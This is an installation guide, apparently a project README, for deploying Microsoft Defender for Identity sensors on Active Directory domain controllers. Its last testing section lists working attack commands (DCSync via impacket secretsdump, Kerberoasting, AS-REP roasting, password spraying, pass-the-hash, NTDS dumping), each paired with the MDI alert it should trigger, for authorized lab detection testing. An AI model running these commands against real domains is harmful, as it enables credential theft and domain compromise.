# Microsoft Defender for Identity (MDI) - Installation Guide

## Table of Contents
1. [Overview](#overview)
2. [Prerequisites](#prerequisites)
3. [Licensing Requirements](#licensing-requirements)
4. [VMware Configuration (Manual)](#vmware-configuration-manual)
5. [Automated Configuration Script](#automated-configuration-script)
6. [Validate Configuration](#validate-configuration)
7. [Install MDI Sensor](#install-mdi-sensor)
8. [Configure DSA in Portal](#configure-dsa-in-portal)
9. [Testing MDI Detection](#testing-mdi-detection)
10. [Troubleshooting](#troubleshooting)

---

## Overview

Microsoft Defender for Identity (MDI) is a cloud-based security solution that leverages your on-premises Active Directory signals to identify, detect, and investigate advanced threats, compromised identities, and malicious insider actions.

### What MDI Detects
- Reconnaissance attacks (LDAP, DNS, SMB enumeration)
- Compromised credentials (brute force, password spray)
- Lateral movement (Pass-the-Hash, Pass-the-Ticket, Kerberoasting)
- Domain dominance (DCSync, Golden Ticket, Skeleton Key)
- Data exfiltration

### MDI Sensor Versions

| Sensor Version | MDE Required | Notes |
|----------------|--------------|-------|
| **v2.x (Classic)** | No | Standalone sensor, works independently |
| **v3.x (Unified)** | Yes | Requires Microsoft Defender for Endpoint on DC |

> **Note:** You can install MDI without Microsoft Defender for Endpoint (MDE) using the v2.x classic sensor.

---

## Prerequisites

### Supported Operating Systems
- Windows Server 2016
- Windows Server 2019 (requires KB4487044 or newer)
- Windows Server 2022
- Server Core supported; Nano Server NOT supported

### Hardware Requirements

| Traffic Level | CPU Cores | RAM |
|--------------|-----------|-----|
| Low | 2+ | 6 GB+ |
| Medium | 4+ | 8 GB+ |
| High | 8+ | 12 GB+ |

### Software Requirements
- Microsoft .NET Framework 4.7 or later
- Npcap OEM version 1.0 or later (auto-installed)

### Network Requirements
- Time synchronization within 5 minutes across all DCs
- Internet connectivity to `*.atp.azure.com`
- Trusted Root CA certificates installed

---

## Licensing Requirements

MDI requires one of the following Microsoft 365 licenses:
- Enterprise Mobility + Security E5/A5
- Microsoft 365 E5/A5/G5
- Microsoft 365 E5/A5/G5/F5 Security
- Microsoft 365 F5 Security + Compliance

---

## VMware Configuration (Manual)

If running MDI sensor on VMware virtual machines, you **must disable Large Send Offload (LSO)** to ensure proper network traffic capture.

### Step-by-Step (GUI)

1. Open **Device Manager** on the Domain Controller
2. Expand **Network Adapters**
3. Right-click on the network adapter > **Properties**
4. Go to **Advanced** tab
5. Find and disable the following settings:

| Setting | Value |
|---------|-------|
| Large Send Offload V2 (IPv4) | **Disabled** |
| Large Send Offload V2 (IPv6) | **Disabled** |
| Large Send Offload (IPv4) | **Disabled** (if present) |
| Large Send Offload (IPv6) | **Disabled** (if present) |

6. Click **OK**

### PowerShell Alternative

```powershell
# Disable LSO on all network adapters
Get-NetAdapter | Get-NetAdapterAdvancedProperty -DisplayName "*Large Send Offload*" | 
    Set-NetAdapterAdvancedProperty -RegistryValue 0

# Verify settings
Get-NetAdapter | Get-NetAdapterAdvancedProperty -DisplayName "*Large Send Offload*"
```

> **Why?** LSO offloads packet segmentation to the NIC hardware, which can cause MDI to miss network traffic during capture.

### Hyper-V Configuration

For Hyper-V virtual machines:

| Setting | Action |
|---------|--------|
| Dynamic Memory | **Disable** |
| Memory | Fixed allocation (minimum 6 GB) |

```powershell
# Disable dynamic memory for a VM
Set-VMMemory -VMName "YourDCName" -DynamicMemoryEnabled $false -StartupBytes 8GB
```

---

## Automated Configuration Script

Use the `full_mdi_config.ps1` script to automatically configure all MDI prerequisites.

### What the Script Configures

| Component | Description |
|-----------|-------------|
| Directory Service Account (DSA) | Creates gMSA account with proper permissions |
| Deleted Objects Permissions | Grants read access to Deleted Objects container |
| Firewall Rules | Opens all required ports (135, 137, 445, 3389, 53) |
| Advanced Audit Policies | Enables all required audit policies |
| NTLM Auditing | Configures registry settings for NTLM audit |
| SAM-R Permissions | Configures lateral movement path detection |
| Object Auditing (SACL) | Configures domain SACL for MDI |
| Power Settings | Sets High Performance power plan |

### Script Parameters

| Parameter | Description | Default |
|-----------|-------------|---------|
| `-Domain` | Domain FQDN to configure | Current domain |
| `-DSAName` | Name of the Directory Service Account | `mdiSvc01` |
| `-DSAType` | Type of DSA: `gMSA` or `Regular` | `gMSA` |
| `-DSAGroupName` | Security group name for gMSA | `mdiSvc01Group` |
| `-SkipDSACreation` | Skip DSA creation (use existing account) | False |
| `-ValidateOnly` | Check configuration without making changes | False |

### Usage Examples

```powershell
# Run with default settings (creates gMSA named mdiSvc01)
.\full_mdi_config.ps1

# Run with custom DSA name
.\full_mdi_config.ps1 -DSAName "myMDIAccount"

# Run in validation mode (check only, no changes)
.\full_mdi_config.ps1 -ValidateOnly

# Skip DSA creation (use existing account)
.\full_mdi_config.ps1 -DSAName "existingAccount" -SkipDSACreation

# Use regular user account instead of gMSA
.\full_mdi_config.ps1 -DSAName "mdiUser" -DSAType Regular
```

### Running the Script

1. Copy `full_mdi_config.ps1` to the Domain Controller
2. Open PowerShell as Administrator
3. Run the script:

```powershell
.\full_mdi_config.ps1
```

4. Wait for the script to complete
5. Review the summary output

---

## Validate Configuration

### Install DefenderForIdentity PowerShell Module

```powershell
# Install the module
Install-Module -Name DefenderForIdentity -Force

# Import the module
Import-Module DefenderForIdentity
```

### Test DSA Permissions

```powershell
Test-MDIDSA -Identity 'mdiSvc01' -Detailed
```

**Expected Results:**

| Test | Expected Status | Meaning |
|------|-----------------|---------|
| SensitiveGroupsMembership | True | NOT in admin groups (secure) |
| ExplicitDelegation | True | No dangerous delegations |
| DeletedObjectsContainerPermission | True | Can read Deleted Objects |
| PasswordRetrieval | True | DCs can retrieve gMSA password |

### Run Official Readiness Check (Optional)

```powershell
# Download official readiness script
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/microsoft/Microsoft-365-Defender-Hunting-Queries/main/Tools/DefenderForIdentity/Test-MdiReadiness.ps1" -OutFile "Test-MdiReadiness.ps1"

# Run with HTML report
.\Test-MdiReadiness.ps1 -OpenHtmlReport
```

---

## Install MDI Sensor

### Download Sensor

1. Go to **Microsoft Defender Portal**: https://security.microsoft.com
2. Navigate to: `Settings > Identities > Sensors`
3. Click **Add sensor**
4. Download the sensor installer
5. Copy the **Access Key**

### Install Sensor

```powershell
# Silent installation
& ".\Azure ATP Sensor Setup.exe" /quiet NetFrameworkCommandLineArguments="/q" AccessKey="<YOUR_ACCESS_KEY>"
```

Or run the installer GUI and enter the Access Key when prompted.

### Verify Sensor Status

1. Go to **Microsoft Defender Portal**
2. Navigate to: `Settings > Identities > Sensors`
3. Verify sensor shows **Running** status

---

## Configure DSA in Portal

1. Go to **Microsoft Defender Portal**: https://security.microsoft.com
2. Navigate to: `Settings > Identities > Directory Service accounts`
3. Click **Add credentials**
4. Enter:

| Field | Value |
|-------|-------|
| Account name | `mdiSvc01$` (note the `$` for gMSA) |
| Group managed service account | ✅ Checked |
| Domain | `yourdomain.com` |
| Password | Leave blank |

5. Click **Save**

---

## Testing MDI Detection

Use these commands from Kali Linux to test MDI detection. **Only use in authorized lab environments.**

### Attack Commands

| Attack | Command |
|--------|---------|
| **DCSync** | `impacket-secretsdump domain/admin:'Pass'@DC_IP -just-dc-user krbtgt` |
| **Kerberoasting** | `impacket-GetUserSPNs domain/admin:'Pass' -dc-ip DC_IP -request` |
| **AS-REP Roasting** | `impacket-GetNPUsers domain/ -dc-ip DC_IP -usersfile users.txt -no-pass` |
| **Password Spray** | `nxc smb DC_IP -u users.txt -p 'Pass123' --continue-on-success` |
| **LDAP Recon** | `nxc ldap DC_IP -u admin -p 'Pass' --users` |
| **SMB Enum** | `nxc smb DC_IP -u admin -p 'Pass' --shares` |
| **Pass-the-Hash** | `nxc smb DC_IP -u admin -H '<NTLM_HASH>'` |
| **NTDS Dump** | `nxc smb DC_IP -u admin -p 'Pass' --ntds` |

### Expected MDI Alerts

| Attack | MDI Alert Name |
|--------|----------------|
| DCSync | Suspected DCSync attack (replication of directory services) |
| Kerberoasting | Suspected Kerberoasting activity |
| AS-REP Roasting | Suspected AS-REP Roasting attack |
| Password Spray | Password spray attack |
| Brute Force | Brute force attack |
| NTDS extraction | Suspected NTDS theft |
| Reconnaissance | Account/Group enumeration reconnaissance |
| Pass-the-Hash | Suspected identity theft (pass-the-hash) |
| Pass-the-Ticket | Suspected identity theft (pass-the-ticket) |

> **Note:** Alerts may take 5-15 minutes to appear in the Microsoft Defender portal.

---

## Troubleshooting

### Sensor Not Starting

```powershell
# Check sensor service status
Get-Service -Name "AATPSensor"

# Check sensor logs
Get-Content "C:\Program Files\Azure Advanced Threat Protection Sensor\Logs\*.log" -Tail 50
```

### Connectivity Issues

```powershell
# Test connectivity to MDI cloud
Test-NetConnection -ComputerName "yourtenant.atp.azure.com" -Port 443
```

### DSA Permission Issues

```powershell
# Verify DSA can read Deleted Objects
$DomainDN = (Get-ADDomain).DistinguishedName
dsacls "CN=Deleted Objects,$DomainDN"
```

### Time Sync Issues

```powershell
# Check time sync status
w32tm /query /status

# Force time sync
w32tm /resync /force
```

---

## Quick Reference

| Item | Value |
|------|-------|
| Microsoft Defender Portal | https://security.microsoft.com |
| MDI Documentation | https://learn.microsoft.com/en-us/defender-for-identity/ |
| Sensor Logs | `C:\Program Files\Azure Advanced Threat Protection Sensor\Logs\` |
| Sensor Service | `AATPSensor` |
| Updater Service | `AATPSensorUpdater` |

---

**Document Version:** 1.0  
**Last Updated:** 2025
